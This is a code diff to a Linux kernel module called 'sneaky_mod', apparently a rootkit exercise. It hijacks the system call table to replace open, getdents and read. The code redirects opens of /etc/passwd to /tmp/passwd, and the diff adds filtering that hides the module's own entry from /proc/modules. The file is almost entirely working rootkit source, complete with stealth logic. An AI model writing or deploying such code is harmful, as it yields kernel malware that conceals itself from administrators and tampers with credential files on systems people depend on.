@@ -1,4 +1,3 @@
-#include <linux/module.h>      // for all modules 
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
 #include <asm/current.h>       // process information
@@ -8,9 +7,20 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/module.h>      // for all modules
 
 static char * pid;
 module_param(pid, charp, 0);
+
+static int openFlag = 0;
+
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[];
+};
+
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -32,27 +42,24 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;
 //We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;
 
-struct linux_dirent {
-u64 d_ino;
-s64 d_off;
-unsigned short d_reclen;
-char d_name[];
-};
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(const char *pathname, int flags);
+asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);
 
 //Define our new sneaky version of the 'open' syscall
-asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
 {
   if(strcmp(pathname,"/etc/passwd")==0){
     //the len of "/tmp/passwd\0" is 12
     copy_to_user((void*)pathname,"/tmp/passwd",12);
   }
-  return original_call(pathname, flags);
+  else if(strstr(pathname,"/proc/modules")!=NULL){
+    openFlag = 1;
+  }
+  return original_open(pathname, flags, mode);
 }
 
 //Function pointer will be used to save address of original 'getdents' syscall.
@@ -90,14 +97,16 @@ asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
   ssize_t ret;
   ret = original_read(fd,buf,count);
-  if(ret>0){
-    int len = 0;
-    char * start = strstr(buf,"sneaky_mod");
+  if(ret>0&&openFlag==1){
+    char* start = strnstr(buf,"sneaky_mod",ret);
+    openFlag = 0;
     if(start!=NULL){
-      char * end = strstr(start,"\n");
-      len = end-start+1;
-      ret -= len;
-      memmove(start,end+1,(char*)buf+ret-1-end);
+      char* end = strnstr(start,"\n",ret-(start-(char*)buf));
+      if(end!=NULL){
+	int len = end-start+1;
+	memmove(start,end+1,(char*)buf+ret-1-end);
+	ret -= len;
+      }
     }
   }
   return ret;
@@ -123,7 +132,7 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
@@ -159,7 +168,7 @@ static void exit_sneaky_module(void)
 
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
-  *(sys_call_table + __NR_open) = (unsigned long)original_call;
+  *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
